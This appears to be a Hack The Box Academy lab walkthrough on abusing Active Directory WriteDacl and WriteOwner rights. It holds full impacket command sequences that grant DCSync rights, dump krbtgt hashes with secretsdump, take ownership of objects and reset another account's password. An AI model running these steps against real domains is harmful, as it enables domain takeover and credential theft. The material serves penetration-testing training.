In the context of Active Directory, specific permissions, such as `WriteDacl` and `Ownership`, play a crucial role in controlling access to objects and ensuring their security. The `WriteDacl` access right refers to the privilege that allows an account to modify the `DACL` of a target object. `Ownership` on the other hand denotes the state of possessing administrative control over an object. Understanding the significance of these access rights is essential as they can impact the vulnerability and potential abuses associated with the manipulated `DACL`.

Suppose we possess an account with privileges to modify a target object's `DACL` through the `ownership` or `WriteDacl` access rights. In that case, we can use that account to edit the target's `DACL` and make it vulnerable to other attacks.

In the following example, we hijacked an account with `WriteDacl` over the root domain object. We can use this access rights to grant us `DCSync` rights. The domain's `DACL`, if edited, can grant us enough rights to perform a [DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync) attack.

## Identifying Vulnerable Objects

We can use `BloodHound` to identify objects vulnerable to `WriteDacl` or with the edge `Owner`. Although we can use the cypher query we used before and replace it with `WriteDacl` or `Owner`, this may create many difficult paths to check. We can use the pathfinding option to identify the paths from the account we have control of to our target:

![luna_writedacl_domain.jpg](https://academy.hackthebox.com/storage/modules/219/luna_writedacl_domain.jpg)

We can also use `PowerView` to identify if `Luna` has Active Directory rights over the domain `INLANEFREIGHT.LOCAL`. To do so, we will use the function `Get-DomainSID` and pass it to the function `Get-DomainObjectAcl`; this is because if we use `-Identity` `inlanefreight.local`, we will get a few more objects due to inheritance issues and the domain name appearing on those objects:

# Querying Luna's DACL over the Domain

```shell
anas21@htb[/htb]$ python3 examples/dacledit.py -principal luna -target-dn dc=inlanefreight,dc=local -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-1267651629-1192007096-1618970724-4618)
[*]   ACE[46] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE
[*]     Access mask               : WriteDACL (0x40000)
[*]     Trustee (SID)             : luna (S-1-5-21-1267651629-1192007096-1618970724-4618)
```

# Abusing WriteDACL from Linux

The `WriteDacl` access right in the domain does not allow us to perform the `DCSync` attack, but we must use it to assign an account the rights to be able to perform the `DCSync`. To assign `DCSync` access rights to `Luna`'s account or any other account, we can use `dacledit.py` from Linux.

Before editing the domain's `DACL`, let us try to perform the `DCSync` attack using [secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) from [impacket](https://github.com/fortra/impacket):

# Attempting DCSync before DACL Modification

```shell
anas21@htb[/htb]$ secretsdump.py -just-dc-user krbtgt inlanefreight.local/luna:Moon123@10.129.205.81

Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up...
```

Up until now, the only action we have done with `dacledit.py` has been querying `DACLs`; however, this tool also allows us to modify `DACLs`. We will use the `-action write` option to indicate that we want to modify the `DACL`, followed by the `-rights dcsync` option to indicate the access rights we want to assign to the account one we have selected.

# Modify DACLs with dacledit.py

```shell
anas21@htb[/htb]$ python3 examples/dacledit.py -principal luna -target-dn dc=inlanefreight,dc=local -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123 -action write -rights DCSync

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] DACL backed up to dacledit-20230518-130322.bak
[*] DACL modified successfully!
```

Afterward, if we enumerate the `DACL`, we will be able to see that the access rights were indeed modified:

# Querying Luna's DACL over the Domain

```shell
anas21@htb[/htb]$ python3 examples/dacledit.py -principal luna -target-dn dc=inlanefreight,dc=local -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-1267651629-1192007096-1618970724-4618)
[*]   ACE[12] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ControlAccess
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : DS-Replication-Get-Changes (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
[*]     Trustee (SID)             : luna (S-1-5-21-1267651629-1192007096-1618970724-4618)
[*]   ACE[15] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ControlAccess
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
[*]     Trustee (SID)             : luna (S-1-5-21-1267651629-1192007096-1618970724-4618)
[*]   ACE[48] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE
[*]     Access mask               : WriteDACL (0x40000)
[*]     Trustee (SID)             : luna (S-1-5-21-1267651629-1192007096-1618970724-4618)
```

Once we edit the `DACL` for the Domain, we can perform `DCSync`:

# Attempting DCSync after DACL Modification

```shell-session
anas21@htb[/htb]$ secretsdump.py -just-dc-user krbtgt inlanefreight.local/luna:Moon123@10.129.205.81

Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:dafbbaba2fef3addbba5b4fedfc38dab:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:88083fd1b5ea038d4f1e89719b98315839d68f7f398963df5b5adea69fb1dbda
krbtgt:aes128-cts-hmac-sha1-96:4075cb5503450cb3e05d4321891c923e
krbtgt:des-cbc-md5:08319dfd4a6891c7
[*] Cleaning up...
```

---
----
# Abusing other Objects with WriteDacl

If we encounter some other objects such as a group or a user, we can assign `FullControl` over the object and abuse these access rights accordingly. Let us take as an example the `Finance group` over which `Luna` has `WriteDacl`. We will have to use `Luna`'s privileges to assign `FullControl` and then `add` a user to the group to abuse this privilege.

#### Querying Luna's DACLs over the Finance Group

```shell
anas21@htb[/htb]$ python3 examples/dacledit.py -principal luna -target "Finance" -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-1267651629-1192007096-1618970724-4618)
[*]   ACE[20] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : WriteDACL (0x40000)
[*]     Trustee (SID)             : luna (S-1-5-21-1267651629-1192007096-1618970724-4618)
```

#### Modifying Luna's DACLs over the Finance group

```shell
anas21@htb[/htb]$ python3 examples/dacledit.py -principal luna -target "Finance" -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123 -action write

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] DACL backed up to dacledit-20230524-211441.bak
[*] DACL modified successfully!
```

#### Querying Luna's DACLs over the Finance Group after Modification

```shell
anas21@htb[/htb]$ python3 examples/dacledit.py -principal luna -target "Finance" -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-1267651629-1192007096-1618970724-4618)
[*]   ACE[3] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : FullControl (0xf01ff)
[*]     Trustee (SID)             : luna (S-1-5-21-1267651629-1192007096-1618970724-4618)
[*]   ACE[21] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : WriteDACL (0x40000)
[*]     Trustee (SID)             : luna (S-1-5-21-1267651629-1192007096-1618970724-4618)
```

Now we can add a user to the group using [addusertogroup](https://github.com/juliourena/ActiveDirectoryScripts/blob/main/Python/addusertogroup.py):

#### Using addusertogroup.py to add Luna to the Finance group

```shell
anas21@htb[/htb]$ python3 addusertogroup.py -d inlanefreight.local -g "Finance" -a luna -u luna -p Moon123

[+] Connected to Active Directory successfully.
[+] Group Finance found.
[+] User luna found.
[+] User added to group successfully.
```

If we want to revert the `DACL` modification, we can use the backup file generated by `dacledit.py` when we performed the `write action`:

#### Restoring the DACL using the Backup File

```shell
anas21@htb[/htb]$ python3 examples/dacledit.py -principal luna -target "Finance" -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123 -action restore -file dacledit-20230524-211441.bak

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] File dacledit-20230524-211441.bak already exists, I'm refusing to overwrite it, setting another filename
[*] DACL backed up to dacledit-20230524-211953.bak
[*] Restoring DACL
[*] DACL modified successfully
```
#### Querying Luna's DACLs over the Finance Group after Reversion

```shell
anas21@htb[/htb]$ python3 examples/dacledit.py -principal luna -target "Finance" -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-1267651629-1192007096-1618970724-4618)
[*]   ACE[20] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE
[*]     Access mask               : WriteDACL (0x40000)
[*]     Trustee (SID)             : luna (S-1-5-21-1267651629-1192007096-1618970724-4618)
```

---
---

# Grant ownership

We obtained access to an account with the `WriteOwner` access right over a target object. This particular account allows us to modify the `owner` of the target object, specifically the `OwnerSid` sub-attribute within the object's `security descriptor`. Exploiting this `access right` opens up possibilities for various abuses, depending on the target object: if we have `WriteOwner` over a `user` we can assign all rights to another account (which will allow us to perform a `Password Reset` or `targeted Kerberoasting`), if it is a `group` we can add or remove members, and if it is a `GPO` we can modify it.

Note: GPO Attacks as well other DACL abuses (such as computer attacks) will be covered in other DACL Attacks mini-modules.

The `WriteOwner` access right allows us to modify the object's owner; however, when using `dacledit.py` or `PowerView`, these tools will not show us any access rights we can abuse. For example, `Lilia` is the owner of the group `Managers`, if we use `PowerView` or `dacledit.py`, we will not get any result if we look for the object `DACL`:

# Query Lilia's DACL over Managers with dacledit.py


```shell
anas21@htb[/htb]$ python3 examples/dacledit.py -principal lilia -target Managers -dc-ip 10.129.205.81 inlanefreight.local/lilia:DACLPass123
Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-1267651629-1192007096-1618970724-5608)
```

However, we can use `BloodHound` to detect this relationship:

![lilia_owns_managers_bloodhound.jpg](https://academy.hackthebox.com/storage/modules/219/lilia_owns_managers_bloodhound.jpg)

---
---

# Identifying Vulnerable Objects

Suppose that we successfully gained access to `Pedro`, an account with `WriteOwner` over the user account `GPOADMIN`.

First, we will use `BloodHound` with a cypher query to identify those access rights. We include `n:User` so that `BloodHound` returns only paths created from a user object. We can do the same with groups; however, that will create too many paths, making it more challenging to analyze.

```cypher
MATCH p=((n:User)-[r:WriteOwner]->(m)) RETURN p
```

![writeowner_user.jpg](https://academy.hackthebox.com/storage/modules/219/writeowner_user.jpg)


```shell
anas21@htb[/htb]$ python3 examples/dacledit.py -principal pedro -target GPOAdmin -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```

Before editing the target's `Owner` and `DACL`, let us try to perform a password reset to confirm that we do not have such privileges:

# Password Reset Attempt to the GPOAdmin Account

```shell
anas21@htb[/htb]$ net rpc password GPOAdmin Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81

Failed to set password for 'GPOAdmin' with error: Access is denied..
```

---
---

# Abusing WriteOwner from Linux

From Linux, we can use [Impacket](https://github.com/SecureAuthCorp/impacket)'s [owneredit.py](https://raw.githubusercontent.com/ShutdownRepo/impacket/owneredit/examples/owneredit.py) python script. At the time of writing, the [pull request #1323](https://github.com/SecureAuthCorp/impacket/pull/1323) offering this tool is still being reviewed. `owneredit.py` has the following main command-line arguments:

- `-action` defines the operation to perform. It can be `-action read` or `-action write`. In this case, we will set it to `read`. If no argument is set, the default is `read`.
- `-target`, `-target-sid`, or `-target-dn` respectively define the `sAMAccountName`, `Security Identifier`, or `Distinguished Name` of the object from which the `DACL` must be retrieved and parsed.
- `-new-owner`, `-new-owner-sid`, or `-new-owner-dn` respectively define the `sAMAccountName`, `Security Identifier`, or `Distinguished Name` of the object to set as the new owner of the target object.

Let us download the tool directly from [ShutdownRepo/Impacket](https://github.com/ShutdownRepo/impacket/blob/owneredit/examples/owneredit.py) and save it in the same folder where we have `dacledit.py` and execute the attack:

#### Downloading and Using owneredit.py

Granting Rights and Ownership

```shell
anas21@htb[/htb]$ wget -q https://raw.githubusercontent.com/ShutdownRepo/impacket/owneredit/examples/owneredit.py -O ./shutdownRepo/impacket/examples/owneredit.py
anas21@htb[/htb]$ python3 examples/owneredit.py -action write -new-owner pedro -target GPOAdmin -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] Current owner information below
[*] - SID: S-1-5-21-1267651629-1192007096-1618970724-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] OwnerSid modified successfully!
```

Once the `owner` is changed, the `Pedro` account does not have (yet) enough access rights to conduct a password reset. However, the ownership of the target object allows for editing its `DACL` and grant the necessary rights. Let us grant `Pedro` the access right to perform a password reset. `dacledit.py` allow us to modify a `DACL` and add the following predefined rights: `FullControl`, `ResetPassword`, `WriteMembers`, and `DCSync`, but we can also use the `-rights-guid` option to specify any other extended access right manually. `FullControl` is the default access right (use the help menu to get more information). Let us grant `Pedro` `FullControl` over the `GPOAdmin` account:

#### Changing User Rights with dacledit.py

Granting Rights and Ownership

```shell
anas21@htb[/htb]$ python3 examples/dacledit.py -principal pedro -target GPOAdmin -action write -rights FullControl -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] DACL backed up to dacledit-20230519-095451.bak
[*] DACL modified successfully!
```

Now, we can perform the password reset and test that the credentials are correct:

#### Password Reset GPOAdmin

Granting Rights and Ownership

```shell
anas21@htb[/htb]$ net rpc password GPOAdmin Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
anas21@htb[/htb]$ poetry run crackmapexec ldap 10.129.205.81 -u GPOAdmin -p Mynewpassword1 

SMB         10.129.205.81   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        10.129.205.81   389    DC01             [+] INLANEFREIGHT.LOCAL\GPOAdmin:Mynewpassword1
```